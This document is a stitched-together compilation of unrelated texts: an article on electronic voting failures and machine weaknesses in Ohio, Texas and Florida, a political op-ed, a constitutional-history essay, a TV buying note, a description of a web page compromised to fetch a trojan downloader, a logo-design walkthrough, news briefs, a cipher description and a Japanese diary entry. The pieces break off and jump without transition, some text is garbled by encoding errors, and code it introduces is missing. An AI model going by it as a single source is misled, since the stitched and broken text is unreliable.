I 've been further informed by the founder of ESI that there were around 60 different copies of the final vote database ( an unencrypted Access database , if you recall from my election article ) , and that there was no naming convention in place to enable officials to tell one from the other .
When ESI asked for a copy of the vote tally database for auditing purposes , the response was ( and I 'm paraphrasing here ) , " Which one ? "
The upshot of all of this is that , in spite of the presence of a legally mandated VVPAT , technical and procedural problems ( not to mention still - missing paper rolls , memory cards , and voting machines ) make it fundamentally impossible to carry out a meaningful audit of the results of the May 2nd primary in Cuyahoga County .
So whatever happened on May 2nd in Cuyahoga County , it only superficially resembled an " election . "
More missing stuff , and more eyebrow - raisers from the second report
The ESI report says that 29 AccuVote machines went missing after the election .
They just disappeared , and I 've verified in a phone interview with the founder of ESI that none of these machines have turned up yet .
At this point , I 'll go ahead and remind you that the Princeton team that wrote the vote - stealing virus mentioned in my article did so by reverse - engineering an AccuVote .
They had no access to any source code or documentation ; all they had was one AccuVote and a little time .
A second report that was released this week , this time by a specially appointed Cuyahoga County commission , contained yet another bonanza of depressing details that cast serious doubt on the integrity of the primary , and on the possibility of having a real election on November 7th .
I 've already spent a lot of space here on the ESI report , so I 'm going give you Kim Zetter 's bullet - point summary of bad news , from her Wired article :
Due to poor chain of custody for supplies and equipment , 812 voter - access cards ( which voters place in touch - screen machines to cast their ballot ) were lost , along with 215 card encoders , which program the voter - access cards .
Three hundred thirteen keys to the voting machines ' memory - card compartments , where votes are stored , also went missing .
Officials set up two user accounts on the computer running vote - tabulation software , then assigned one password to both accounts and allowed multiple people to use them , thwarting any effort to identify individuals who might access and alter the system .
Sixty Board of Election employees took touch - screen machines home a weekend before the election to test a procedure for transmitting data on election night .
The election board hired 69 taxis to transport observers to precincts to collect memory cards and paper rolls on election night .
But many cab drivers ended up gathering the materials themselves , and about half the cabs returned to the warehouse with election data , but no observer .
In at least 79 precincts the number of voters who signed the poll books did n't match the number of ballots cast .
At least eight precincts had more ballots cast than registered voters .
Because some polling places served several precincts , some of the discrepancies are explained by voters being directed to the wrong machines , an error that did not result in uncounted votes .
But even when investigators tallied ballots and signatures for all precincts in a polling place , 15 locations still had mismatches .
In one case investigators found 342 more voters than ballots .
So enough hardware went missing in the May 2nd primary to allow a group to host an entire election .
All the Princeton team needed to write a vote - stealing virus was one DRE .
To sum up , if we randomly assume that deliberate vote manipulation was not a factor in any of the problems surrounding the May 2nd primary in Cuyahoga County , then here 's what 's scary : all of the technical and procedural breakdowns outlined in these two reports happened on their own , over the course of a relatively low turn - out election , without any help from bad actors .
Can you imagine if deliberate wholesale fraud were thrown into this mix , especially in the context of a high - turnout , hotly contested election ?
What about the VVPAT ?
Before leaving the topic of Ohio , I want to make a few quick points about the failure of the voter verified paper audit trail ( VVPAT ) .
Opponents of the VVPAT will be quick to hold these reports up as evidence that VVPAT is not a magical cure - all .
These people are right : it 's not a magical cure - all , and it is n't supposed to be .
All that proponents of a VVPAT are insisting on is that it 's infinitely better to have one than to not have one .
No , the real take - home from the May 2 primary in Cuyahoga County is that a VVPAT is worthless if it's not implemented properly .
Here are the problems with AccuVote TSx implementation .
The printer on the AccuVote is one of those cheap roll printers of the type that commonly jams in the supermarket checkout line .
The failure rates of such printers are extremely high , and they 're simply not adequate for use in voting machines .
Also , the cheap roll paper is thin , fragile , prone to jamming , and not suitable archival material .
A real VVPAT would be printed by more high quality printer on heavy card stock that 's meant to last .
The damaged paper rolls , and many of the instances where the receipts were illegible due to printer malfunction ( e.g. a jammed printer prints multiple times over the same stretch of paper without advancing to a clean sheet ) can be directly attributed to the shoddy printer and paper used to print these receipts .
No matter how great the printer is and how sturdy the printer paper , a VVPAT is worthless if it goes missing , or is destroyed , or if it can't be tied to a particular machine because there 's no canister label .
A VVPAT is worthless if an random audit of the votes is not carried out after each election .
A VVPAT does n't make a whole lot of sense if there 's no procedure in place for the voter to dispute an incorrectly recorded vote .
In other words , what happens if you vote , and the printed receipt indicates that your vote was miscast by the machine ?
Can the poll worker delete that vote , remove the receipt , and let you go again ?
Or do you just have to suck it up and know that your vote was miscast ?
Problems in Texas and Florida
Shortly after my recent election fraud article went live , I got email from a Texas woman whose daughter reads Ars .
This woman claims that during early voting she voted a straight Democratic ticket at a precinct in Collin County ( in Dallas ) , but the touch - screen that she used kept flipping all of the votes to a straight Republican ticket at the confirmation screen .
She and a poll worker were unable to resolve the issue , so she wound up voting for Republicans across the board .
A local TV station in Jefferson County , Texas is running a report that indicates that others have had this exact same problem .
In some cases , a straight Democratic ticket has Republican candidates mysteriously mixed in with it .
The Miami Herald reports that this exact same phenomenon is occurring right now in early voting in Florida , complete with the same Democrat - to - Republican vote flipping .
There 's no way to tell whether the reported vote - flipping is the result of malfunction or malfeasance , since there are a nearly infinite number of possible technical problems — from screen misalignment to software glitches — that could cause this kind of behavior .
Furthermore , I would expect that if there were a nationwide Republican conspiracy to hack the vote in both Texas and Florida , that they could find a programmer who'd do a better job of hiding the vote fraud than this .
So I point it out mainly to notify our audience that these kinds of ominous glitches are already showing up in early voting , and to beg poll workers and election officials across the country to immediately power off and seal any machine that does this , so that it can be forensically examined later .
Problems with Diebold optical scanners
Avi Rubin 's blog highlights a major new security study of Diebold 's AccuVote Optical Scan ( AV - OS ) voting machine .
Here 's part of the abstract :
We present an independent security evaluation of the AccuVote Optical Scan voting terminal ( AV - OS ) .
We identify a number of new vulnerabilities of this system which , if exploited maliciously , can invalidate the results of an election process utilizing the terminal .
Furthermore , based on our findings an AV - OS can be compromised with off - the - shelf equipment in a matter of minutes even if the machine has its removable memory card sealed in place .
The basic attack can be applied to effect a variety of results , including entirely neutralizing one candidate so that their votes are not counted , swapping the votes of two candidates , or biasing the results by shifting some votes from one candidate to another .
Such vote tabulation corruptions can lay dormant until the election day , thus avoiding detection through pre-election tests .
Rubin considers the report pretty devastating , and he includes this further tidbit from the report in his blog :
The attacks in this paper are cleverly designed to make a compromised machine appear to work correctly when the system 's audit reports are evaluated or when the machine is subjected to pre-election testing .
Besides manipulation of the voting machine totals and reports , the authors explain how any voter can vote an arbitrary number of times using ( get this ) , Post - it notes , if the voter is left unattended .
That 's right folks : cast multiple votes with a Post - it note .
You can find directions for doing so inside the report .
I wonder if the Post - it hack works on optical scanners from other companies .
This would be worth finding out , since about 40 percent of votes will be cast using optical scanners on the 7th .
Vote multiple times on a Sequoia machine by holding down the yellow button
By way of finishing off today 's litany of positively awful e-voting news , I bring you step - by - step instructions for casting multiple ballots on any Sequoia machine .
No computer skills needed ; just reach around the back of the machine and hold down the yellow button .

Conclusions and some recommendations
If you 're upset and outraged by what you 've read here , then probably the best thing I can think of for you to do is get involved with the Election Transparency Project .
The premise is very straightfoward , and can be summed up like this ( in my own words ) : the mid-term is probably going to be a complete wreck , so the only hope we 'll have of sorting through the mess and enacting meaningful reform is if we have the electoral equivalent of the indestructible " black box " that sits inside every airplane and helps the FAA sort out the causes of the crash .
The Election Transparency Project is aimed at helping voters do what that black box does , i.e. make a lasting and public record of all the relevant information surrouding each local election ( e.g. pre-election testing , conditions at precincts , suspicious activity , etc. ) .
Our only hope at this point lies in the eyes and ears of each person at the polls , and in ordinary citizens ' willingness to confront election officials and demand on - the - record answers to questions about every aspect of their local election .
Only with the aid of massive amount of documentation will we be able to sort through the mess on November 8th .
If you 're a member of the mainstream media and you 've read this summary , here 's what I 'd like you to take away from it :
No business in America would put someone with no computer expertise in charge of a multimillion dollar information technology ( IT ) purchase .
However , this is precisely what we 've done with our election officials .
Good , well - meaning but technically naive bureaucrats all over the country have been sold huge , complex , untested computer systems that masquerade as simple " voting machines . "
These officials have been put in charge of a massive IT procurement project , and they simply are not qualified .
From what I understand , a typical scenario goes something like this : a vendor representative comes in with a demo unit that looks nice and has enough functionality to make it through a closed - door demonstration in front of a technically illiterate audience of county and state election officials , who 're wowed by high - tech glitz .
In support of the purchase , the vendor produces " test results " and " evaluations " from so - called testing companies that are on the vendor 's payroll ( see Lou Dobbs ' recent reporting on this issue ) .
What the county officials do n't know is that the individual voting machines are basically alpha test units ( these officials probably do n't even know what an " alpha test " or " beta test " is ) , and these machines do n't really fit together into anything like a fully functional election system .
Furthermore , the election officials have no clue how to evaluate a large IT purchase ( again , they think they 're buying " voting machines " and not networked computers ) ; and they do n't have a paid or volunteer staff with enough technical know - how to handle a large - scale IT deployment .
What they do have , in the vast majority of cases , is a volunteer army of dedicated but untrained senior citizens , who 're given the impossible task of doing support and maintenance for machines that are fragile , finicky , and insecure .
This is what most of us face on November 7th , as we head to the polls in one of the most important mid-term elections in living memory .
The stakes have never been higher , and the machinery of democracy has never been in such a state of broken - down chaos .
Postscript for Cuyahoga County
In the wake of the two reports cited above , officials in Cuyahoga County have plans to spend almost $ 700,000 on poll worker training .
But no matter how much money they throw at the problem , they can't turn these volunteers in the kind of security - minded technical wizards that they 'd need to be in order to deliver secure , transparent , reliable elections on November 7th .
At every level — from the machines themselves to the vote tabulation and results reporting — the Ohio mid-terms are wide open to malfunction and malfeasance .
Nothing can be done about this in under one week .
The only thing that Ohioans can do is go to the polls on mid-term day and observe everything that happens .
The more citizen eyes that Ohio has watching and recording the events of the day , the easier it will be to sort out what has happened afterwards .
If you live in Ohio and are registered to vote , then please head over to VerifiedVotingFoundation.org and join the Election Transparency Project .
This project will help you know what questions to ask your election officials , and what information to record on election day .
Finally , if you have a problem that you 'd like to report to the media , please try to find other folks who've had the same problem and who'd be willing to go on record about it .
One personal anecdote is not enough to get media coverage of your story ; you 'll need corroborating evidence from others in order to get the attention of the press .
So show up , keep your eyes open , and compare notes afterwards with friends and family .
Good luck , Ohio .
DUMMERSTON , Vt. â € ”
When the lawmakers of the country your occupying do n't want you around any more , you know your war is in trouble .
Last week , the Iraqi Parliament voted to approve a timetable for U.S. forces to withdraw from their country .
More than half the members of the parliament , 144 in all , signed on to the legislative petition .
That might explain why Vice President Dick Cheney made a surprise visit to Iraq last week .
But it wasnâ€™t just the parliamentâ€™s antiwar vote that brought Cheney to Baghdad .
He also stopped by to pressure the Iraqi government to move forward with plans to privatize the state - controlled oil industry and pass a production sharing agreement that would give foreign oil companies a great share of the profits .
However , the bigger concern for the Bush administration ought to be the Iraqi vote for withdrawal .
The majority in the Iraqi parliament that voted for the resolution is an undeniable sign that the nationalists who oppose permanent U.S. military bases and privatization of the oil industry are far greater political force than the administration realizes .
While the sectarian violence in Iraq continues , there is one thing that Shiites , Sunnis and Kurds all agree on â€ ” the desire for a sovereign Iraq free of the heavy hand of the United States .
For all the Bush administration 's talk of its desire to see a united Iraq free of sectarian violence , it has no desire to see an Iraq that has full control over its oil and its economy .
That is why will continue to see U.S. forces in Iraq for the foreseeable future .
The Pentagon announced last week that another 35,000 soldiers will be heading to Iraq this fall as reinforcements for the Bush administration 's so - called surge .
President Bush has made it clear he will not accept any timetables for withdrawal and there still is not enough support in Congress to override a presidential veto .
While there is growing talk from both parties in Congress to give the administration until September to show that it is making progress in Iraq , the reality is that the bulk of the U.S. forces will remain in Iraq through the rest of this year and through all of 2008 as well .
As it stands now , the U.S. Congress wants to see our soldiers leave Iraq .
The Iraqi Parliament wants to see our soldiers leave Iraq .
Most of the opinion polls in both the United States and Iraq show a strong majority supporting the withdrawal of U.S. forces .
But as long as President Bush remains in office , our soldiers will remain in Iraq .
The politicians who oppose the impeachment of President Bush and Vice President Cheney say that energy should devoted toward ending the war .
The reality is that as long as the Bush administration is in power , the United States will stay in Iraq â€ ” no matter how unpopular the occupation becomes with Americans and Iraqis .
This illegal and immoral war will not end until Bush and Cheney are removed from power .
That is the most important argument for their impeachment .
Unfortunately , most Democrats still believe it is safer to let the electoral process run its course and win back the White House in 2008 .
This assumes , of course , that the 2008 election will be free of the vote stealing and other assorted chicanery we saw in 2000 and 2004 .
It also assumes that there will be no " October Surprise " in the fall of 2008 that could shift support to the Republicans .
While the current Republican candidates for president are a motley and uninspiring lot , the Democrats should n't count on an easy victory in 2008 .
If the Democrats wo n't draft articles of impeachment for Bush and Cheney , they must pick up the pace on its investigations .
The Democrats must conclusively put on the public record the extent of the incompetence , lies and corruption of the past six years .
If those investigations follow through to their logical conclusion , it will become impossible not to impeach them .

Wallace : " Congressman Paul , you 're one of six house Republicans who back in 2002 voted against authorizing President Bush to use force in Iraq .
Now you say we should pull our troops out .
A recent poll found that 77 % of Republicans dissaprove of the idea of setting a timetable for withdrawal .
Are you running for the nomination of the wrong party ? "
Paul : " You - you have to realize that the base of the Republican Party shrunk last year because of the war issue , so that percentage represents less people .
If you look at 65 - 70 % of the American people , they want us out of there , they want the war over . "
The evidence for this conclusion is found in the debate over the " no religious test clause " set forth in Art. 6. , Cl. 3 . This clause , in a radical departure from the past , provided that " no religious Test shall ever be required as a Qualification to any Office or public Trust under the United States . "
By this Clause , the Founders proclaimed that men of all religious beliefs , or none , would be treated equally and would be equally eligible for office in the United States .
The radical nature of this clause was not lost on the men who debated and voted on the Constitution .
The proponents of the constitution took the position that the Federal government had NO POWER to pass legislation bearing on religion .
They recognized that the Constitution enacted that there was a wall of separation long before Jefferson ever coined that phrase or the First Amendment was drafted .
This point was forcefully made during the ratification debates .
The forces opposed to the Constitution argued that the " no religious test clause " would lead to papists , jews and pagans obtaining office .
They argued a bigoted position aimed at appealing to the worst sectarian sentiments .
For example , in the ratification debates in North Carolina it was argued :
Mr. LANCASTER . ...
As to a religious test , had the article which excludes it provided none but what had been in the states heretofore , I would not have objected to it .
It would secure religion .
Religious liberty ought to be provided for .
I acquiesce with the gentleman , who spoke , on this point , my sentiments better than I could have done myself .
For my part , in reviewing the qualifications necessary for a President , I did not suppose that the pope could occupy the President 's chair .
But let us remember that we form a government for millions not yet in existence .
I have not the art of divination .
In the course of four or five hundred years , I do not know how it will work .
This is most certain , that Papists may occupy that chair , and Mahometans may take it .
I see nothing against it .
There is a disqualification , I believe , in every state in the Union -- it ought to be so in this system .
And in Massachusetts it was argued :
Mr. CALDWELL thought that some danger might arise .
He imagined it might be objected to in a political as well as in a religious view .
In the first place , he said , there was an invitation for Jews and pagans of every kind to come among us .
At some future period , said he , this might endanger the character of the United States .
Moreover , even those who do not regard religion , acknowledge that the Christian religion is best calculated , of all religions , to make good members of society , on account of its morality .
I think , then , added he , that , in a political view , those gentlemen who formed this Constitution should not have given this invitation to Jews and heathens .
All those who have any religion are against the emigration of those people from the eastern hemisphere .
But the proponents of the Constitution forcefully countered these arguments .
Not by arguing that the fear that non-Christians would obtain office were wholly unfounded , but by arguing the desirability of tolerance and a secular government .
For example , in Massachusetts , the Rev. Daniel Shute a leading proponent of the Constitution , argued :
Rev. Mr. SHUTE . ...
To establish a religious test as a qualification for offices in the proposed federal Constitution , it appears to me , sir , would be attended with injurious consequences to some individuals , and with no advantage to the whole .
By the injurious consequences to individuals , I mean , that some , who , in every other respect , are qualified to fill some important post in government , will be excluded by their not being able to stand the religious test ; which I take to be a privation of part of their civil rights .
...
In this great and extensive empire , there is , and will be , a great variety of sentiments in religion among its inhabitants .
Upon the plan of a religious test , the question , I think , must be , Who shall be excluded from national trusts ?
Whatever answer bigotry may suggest , the dictates of candor and equity , I conceive , will be , None .
Far from limiting my charity and confidence to men of my own denomination in religion , I suppose , and I believe , sir , that there are worthy characters among men of every denomination — among the Quakers , the Baptists , the Church of England , the Papists ; and even among those who have no other guide , in the way to virtue and heaven , than the dictates of natural religion .
I must therefore think , sir , that the proposed plan of government , in this particular , is wisely constructed ; that , as all have an equal claim to the blessings of the government under which they live , and which they support , so none should be excluded from them for being of any particular denomination in religion .
The presumption is , that the eyes of the people will be upon the faithful in the land ; and , from a regard to their own safety , they will choose for their rulers men of known abilities , of known probity , of good moral characters .
The apostle Peter tells us that God is no respecter of persons , but , in every nation , he that feareth him , and worketh righteousness , is acceptable to him .
And I know of no reason why men of such a character , in a community of whatever denomination in religion , caeteris paribus , with other suitable qualifications , should not be acceptable to the people , and why they may not be employed by them with safety and advantage in the important offices of government .
The exclusion of a religious test in the proposed Constitution , therefore , clearly appears to me , sir , to be in favor of its adoption .
And in North Carolina , James Iredell , who subsequently was appointed as a Justice of the Supreme Court by Washington , eloquently argued :
Mr. IREDELL .
Mr. Chairman , nothing is more desirable than to remove the scruples of any gentleman on this interesting subject .
Those concerning religion are entitled to particular respect .
I did not expect any objection to this particular regulation , which , in my opinion , is calculated to prevent evils of the most pernicious consequences to society .
Every person in the least conversant in the history of mankind , knows what dreadful mischiefs have been committed by religious persecutions , Under the color of religious tests , the utmost cruelties have been exercised .
Those in power have generally considered all wisdom centred in themselves ; that they alone had a right to dictate to the rest of mankind ; and that all opposition to their tenets was profane and impious .
The consequence of this intolerant spirit had been , that each church has in turn set itself up against every other ; and persecutions and wars of the most implacable and bloody nature have taken place in every part of the world .
America has set an example to mankind to think more modestly and reasonably -- that a man may be of different religious sentiments from our own , without being a bad member of society .
The principles of toleration , to the honor of this age , are doing away those errors and prejudices which have so long prevailed , even in the most intolerant countries .
In the Roman Catholic countries , principles of moderation are adopted which would have been spurned at a century or two ago .
I should be sorry to find , when examples of toleration are set even by arbitrary governments , that this country , so impressed with the highest sense of liberty , should adopt principles on this subject that were narrow and illiberal .
I consider the clause under consideration as one of the strongest proofs that could be adduced , that it was the intention of those who formed this system to establish a general religious liberty in America .
...
But it is objected that the people of America may , perhaps , choose representatives who have no religion at all , and that pagans and Mahometans may be admitted into offices .
But how is it possible to exclude any set of men , without taking away that principle of religious freedom which we ourselves so warmly contend for ?
This is the foundation on which persecution has been raised in every part of the world .
The people in power were always right , and every body else wrong .
If you admit the least difference , the door to persecution is opened .
...
It would be happy for mankind if religion was permitted to take its own course , and maintain itself by the excellence of its own doctrines .
The divine Author of our religion never wished for its support by worldly authority .
Has he not said that the gates of hell shall not prevail against it ?
It made much greater progress for itself , than when supported by the greatest authority upon earth .
... I hope that I have in some degree satisfied the doubts of the gentleman .
This article is calculated to secure universal religious liberty , by putting all sects on a level -- the only way to prevent persecution .
I thought nobody would have objected to this clause , which deserves , in my opinion , the highest approbation .
This country has already had the honor of setting an example of civil freedom , and I trust it will likewise have the honor of teaching the rest of the world the way to religious freedom also .
God grant both may be perpetuated to the end of time !
John Kennedy proved the fears of the opponents to the Constitution right .
A " papist " became President .
And a " Mohametan " has achieved Congress .
And even during the lifetime of the Founders , men viewed as pagans by some because of their Deist philosophy , achieved the Presidency .
But those opponents of the Constitution were on the losing side of the debate , and their fears were simply prejudices .
Our country 's enlightened Founders considered that the Constitution they enacted was secular , and that it would give equal rights to non-Christians and establish a separation of Church and State , and concluded that it was good .

How many of you bought a high definition television set this year ?
Did you make sure you bought one with the HD Ready logo just to be sure you were buying a set that " future proofs " you against further change ?
Well I have a bit of bad news for you .
Every television manufacturer here at CES is now trumpeting something they are calling " Full HD " .
I bought a high definition TV this year and I was confident that my TV was capable of displaying full HD , at least no - one told me it was " less than full HD " .
So what is " full HD " ?
Basically it 's a TV capable of displaying a resolution of 1080 p - 1920 × 1080 or about two million pixels .
Many televisions in the last year had a top resolution of 1080 i - a slightly less high quality resolution where the lines in the image are shown sequentially instead of all at once in the case of 1080p .
So does it mean your TV is defunct if it can't display 1080 p ?
Absolutely not .
You would only spot the difference between 1080 p and 1080 i if you were viewing content in that format on a TV over 40 inches in size - and even then it 's subjective to some .
But the TV makers have got a new feature to sell and of course they want to charge a premium for it .
So if you have n't got 1080 p , do n't lose any sleep over it .

Here is a typical example of a compromised web page .
Due to a bug in a web application like phpBB2 , Moveable Type or many others , the adversary was able to insert the following line of HTML into your home page :
When visiting your home page , the single line of HTML causes your web browser to load additional content from an external web server .
When looking at the content behind , we find something incomprehensible to us .
It 's a block of javascript that consists only of numbers .
Just by looking at it , we have no idea what the code might do :
However , it 's pretty straight forward to decipher this if you have bookmarked javascript shell - just search for it .
When using jshell to evaluate the javascript from above , it decodes to the following : This resulting javascript uses XMLRPC to download a binary from the Internet .
It saves it on your local hard drive and then uses an ActiveX object to execute it .
According to ClamAV , the executable is a Trojan - Downloader .
This means that it is an application that can download an arbitrary number of other executables on your computer that can then happily sniff your passwords , compromise your bank accounts , display popups or use your computer to send spam .
All of this with just a single line of HTML .
Amazing ?
Right !
The actual example had some more indirections and also threw in some additional visual basic script plus some other goodies that would have complicated our explanation .
I do n’t know about you but I love to see examples of how other designers work — they reveal better ( or worse ) ways of doing things and allow me to gauge whether my methods are mainstream or totally whacked - out .
“ If anyone finds out how I obsess about this stuff , ” I tell myself , “ they ’ll stick me in a home . ”
The problem is that step - by - step examples are rare .
Why ?
Mainly because unless you are interested in sharing such information , there is n’t much reason for recording it .
And even if you are , detailing the steps can get in the way of the process .
If I ’m ready to move to the next stage of an idea , I am normally not interested in recording what I ’ve done to get there .
The good news is I rarely let normal get in my way .
What follows are some of the steps I took to create a recent logo .
I saved some of the graphics I created along the way and have attempted to recall a little bit about what I was thinking .
There is , of course , more to a logo design process than what you see here — this exercise includes little about the typical ramp up of preliminary discussions , research , and so on — space , time , and vanity limit me to showing just a portion of the process .
I do n’t know about you , but I start out on paper .
I find it most productive to sketch out ideas in a notebook .
A Moleskine notebook is my weapon of choice — its small and sturdy enough to carry in my back pocket .
I ’m most concerned with concepts at this stage — not designs .
To my way of thinking , designs emerge from concepts , concepts do not emerge from designs .
My goal in creating a logo is , at best , to demonstrate the benefit of using the product or service and at minimum to create a visual symbol of the subject matter .
I often show my clients those rough ideas .
I have found that getting feedback on basic concepts is best for everyone involved .
It allows us to weed out ideas that look good to me but do n’t work for the client .
It acknowledges that the client knows the subject best , no matter how much research I do .
What may appear to me to be a great solution to the problem sometimes just does n’t work for reasons I could not be expected to know .
The logo I ’ll discuss here was designed for a helicopter transport company — Metro Aviation .
I started by going through my sketches and choosing the concepts I thought had most merit .
Step 1 ( below ) >
I created some slightly tighter drawings of five of the ideas — the first , something to symbolize the basic rotor and lift dynamics .
Step 2 > Second is a helicopter with bird wings .
Yes it ’s ugly ( looks like a bat - copter ) — but we ’re just exploring concepts , not designs .
Step 3 >
Next , a more realistic rendition of a copter integrated with the type — perhaps a flyover where the aircraft casts a shadow in the letter form .
Step 4 >
From the outset , the client expressed an interest in using a hummingbird as a symbol for the helicopter so I began to explore that idea as well .
Step 5 >
The problem with the hummingbird was that , as I began doing research , I found lots of other helicopter companies were using something similar as their mark .
Step 6 >
That did n’t rule it out , it just meant I would have develop the idea further to make it distinctive .
To me , this version looks a bit more like it ’s hovering .
Step 7 >
But it was this design that made me think , “ I ’m onto something , ” — the combination of the hummingbird , the implied motion of hovering , and the additional visual element of rotation added the extra something I was looking for .
My confidence was strengthened further when the client chose it from the lineup .
Step 8 >
The rest , as they say , is history .
The idea of the hovering bird stuck and I began to develop a design .
First , I gathered together some photographs so that my actual design would reflect the correct proportions and positioning .
Step 9 > Research is crucial .
If some aspect of your subject is inaccurate , you can waste amazing amounts of time pursuing a design your client will reject out of hand .
In this case , you can see how different the beginning shape of the actual artwork ( right ) is from my original sketch ( left ) .
Step 10 >
The problem with logo design is you have to create finished art or something close to it to communicate your idea .
I may tweak it after I get the client ’s okay , but I ’ve got to be 95 percent finished with the art to sell it to the client .
My software of choice is Adobe Illustrator .
Here , I started by roughing out the body .
Step 11 > I created the feathers using a series of ovals .
Step 12 >
Then I rotated the body and wing into hovering position .
Step 13 >
You have to mine a lot of rocks to find the gold .
This is one of many ideas I experimented with in my attempt to show “ rotation . ”
Really awful is n’t it ?
Step 14 >
What seemed to work best was to use some type of oval to simulate the blur of the blades .
Step 15 > Even better was a swirl .
I took this clip art element …
Step 16 > and scaled it down vertically .
Then I tilted the bird ’s body back to a vertical position so I was sure to get it centered correctly .
What follows are variations of this basic design .
Step 17 > First , I added color and used the top of the swirl to define the division between the bird ’s body and its head .
I also added a slight gap between the bottom of the swirl and the tail to accentuate the division between the swirl and the body .
Finally , I added another oval below to act as a shadow .
Step 18 > Dividing the swirl into two colors helped to further accentuate the swirling motion .
Step 19 > I tried adding another shape as if the swirl were casting a shadow on the lower body .
It works , but I thought it was getting a little too complex .
Step 20 >
And I tried changing the black swirl to gray .
Step 21 >
This version includes a couple of light gray shapes I thought might give the image a little more of a sense of movement — nope .
Step 22 > I finally settled on filling in the spaces between the bird ’s body and the swirl .
My thinking was to simplify the final version as much as possible and , for me , removing the negative space helped .
Step 23 > I was actually really happy with this basic design .
I even went so far as to work it into a business card layout using the colors the client requested .
Step 24 >
But here comes a reality check .
The client decided the idea of hovering just was n’t convincing enough .
He liked the design but thought the hovering motion would be more true to form if it was above the body as it would be on a helicopter .
Wow .
Its always difficult to hear when a client is n’t as excited about your solution as you are .
But I can tell you the axiom “ the customer is always right ” is always true .
At least if you want to stay in business .
I could spend the time necessary to provide the client with carefully considered , well - spoken reasons for going with what I created , but clients are no different than designers — if it does n’t work for you , it does n’t work for you — period .
Step 25 >
So back to the drawing board .
How do I glue these pieces together in a way that works ?
Step 26 > First , I had to re-think the wings .
The swirl took the place of the wings so I had to get them back in there .
Step 27 >
That worked for me , but the swirl did n’t .
Step 28 > I needed something simpler .
A solid shape ?
Nope too massive .
Step 29 > Again , I found simpler better .
It worked for me and , more importantly , it was just what the client wanted .
Step 30 > Next , I adjusted the colors to match the helicopter color scheme ( blue and yellow ) and added the shadow .
Step 31 > The final hurdle was the tail .
We tried several different versions .
One …
Step 32 > Two …
Step 33 > Three …
Step 34 > and four …
Step 35 > I like it when clients push .
Though I may cry and moan to myself at the time , more often than not , we end up with a better solution .
That said , in this case , I personally prefer the interim solution , but then I ’m not paying the bill .
Logo design is legalized gambling .
When I take on a project I do n’t know if it will take eight hours or five days .
In fact what I ’ve shown you here is the tip of the iceberg .
Above , in PDF form , is a summary of some of the many iterations of the logo .
Though it is a challenge from all sides , there is nothing quite so exciting for a designer than discovering , developing , and implementing an image that becomes the visual representation of an entire organization .
MADRID ( Reuters ) - Council meetings in Reus could take a turn for the bizarre after the northern Spanish town voted in a councillor who promised to turn up dressed as Elvis Presley and wants to turn the square into a nudist pool .
Ariel Santamaria , a former postman , stood for a small independent party dressed in full Elvis regalia complete with sideburns and won enough votes last weekend to take a council seat .
It remains to be seen how other parties will take his proposals for Reus , a town of 100,000 people near Barcelona .
His platform included plans to paint the town hall pink , plant marijuana in the parks and give the town police global positioning systems to find people who might need a light while rolling a joint .
Asia is seeing an “ epidemic of counterfeits ” of life - saving drugs , experts say , and the problem is spreading .
Malaria medicines have been particularly hard hit ; in a recent sampling in Southeast Asia , 53 percent of the antimalarials bought were fakes .
Bogus antibiotics , tuberculosis drugs , AIDS drugs and even meningitis vaccines have also been found .
Estimates of the deaths caused by fakes run from tens of thousands a year to 200,000 or more .
The World Health Organization has estimated that a fifth of the one million annual deaths from malaria would be prevented if all medicines for it were genuine and taken properly .
“ The impact on people ’s lives behind these figures is devastating , ” said Dr. Howard A. Zucker , the organization ’s chief of health technology and pharmaceuticals .
Here we have a typical hybrid realization :
The figure shows connections from a block of 8 input bytes at the top , which are each substituted through keyed " 8 - bit " invertible tables or S - boxes .
Each table represents about 1684 bits of keying .
Each yellow diamond represents half of a linear BBM component .
Each mixing takes two bytes in , and produces a 2 - byte result .
The mixings are arranged in an FFT - style pattern which mixes every byte across the entire block using only byte mixings .
We have a top row of substitutions , then a complete mixing .
Then we have another row of substitutions and another complete mixing .
Then we have a final substitution row , which produces 8 bytes of ciphertext out the bottom .
FFT - style mixing patterns can be computed at ciphering time , so blocks of dynamically arbitrary power - of - 2 size can be ciphered .
Extremely large blocks can be ciphered almost as fast ( per byte ) as smaller blocks , thus possibly avoiding CBC chaining , and providing room for authentication and dynamic keying fields .
派遣社員は同僚じゃないのか
解雇は行き過ぎ、という感想が目立つのはわかるけど、4月に採用されたばかりとのことだから、まだ仮採用期間だろうと思う。私の同期でも一人、本採用されなかった人がいる。まじめで有能だったが、健康に問題があったのだという。「冷たいな」と、そのときは思った。
入 社2年目か3年目の出来事だったと思うけど、数年間の休職から復帰した人がいた。入社1年目に大リストラがあったが、希望退職を募るという方法だったから、退職を希望しなかったその人は会社に残ることができたわけだ。いったん本採用した人は、簡単には解雇できない。会社もたいへんだな、と思った。
いま、うちの職場の派遣さんが病気を抱えていて、休みがちになっている。職場全体で配慮して仕事量を減らし、じっと回復を待っている。幹部が一枚岩でこの方針を支えているから、みな派遣さんに優しい。けれども、それは「表向き」に過ぎなかった。
私と同期の同僚が一人、転職するので、先週末、若手中心に送別会が開かれた。「いやー、本当に残念だな。新しい職場でも健康に気をつけて活躍してね」と、みな心から彼の新しい道行を応援していた。これは彼のいないところでも同じで、さすがうちの会社の社員は人柄がいい、と感心した。
ところが、件の派遣さんの話題になるや、「派遣なのに、どうして人を代えないのか」いきなりガツンとやられた。「当人の手取りの給与は俺らより少ないかもしれないけど、会社が出しているお金は多いはず」20代の手取り月給は20万円を下回る。総支給額も30万円に満たない。でも派遣さんはずっと給与据え置きだよね?
いやいや、そんなレベルの話じゃない。この衝撃は、新人研修で中国の協力工場（平たくいえば下請工場）の労働条件を説明されたときに近い。
ゆっくり、ゆっくり状況を飲み込むにつれ、ふつふつと怒りが湧き上がってきた。病気の心配をする前に「あいつをクビにしろ」とは。「派遣だから」切っていい、と。同じ職場で働く仲間に、どうしてそう冷たくなれるのか。とはいうものの、和やかな送別会の席をぶち壊すだけの確信はない。
「あの……ぼくは、格差社会とか、嫌いですから」サーッと潮が引くように空気が冷め、派遣さん叩きの話題は唐突に終わった。
補記
中国工場の件、結局、5年間何もせず現在に至る。一社員の立場でどうこうできるものでもない、なんて言い訳だ。搾取の受益者がこんな日記で義憤を書くなど、あまりに偽善的。
昇進には興味ありません、といってクビにならない程度にグダグダ仕事をしている私のような人間は、受益者の地位に安住して、誰も助ける気がないのだと思う。能力主義志向の若手が幹部になる頃、私は進退窮まって人生を後悔するに違いない。そう予想しながらもなお、私は何もしない。何故だ?

HOUSING BUBBLE UPDATE … .
The housing market in Southern California continues to deteriorate :
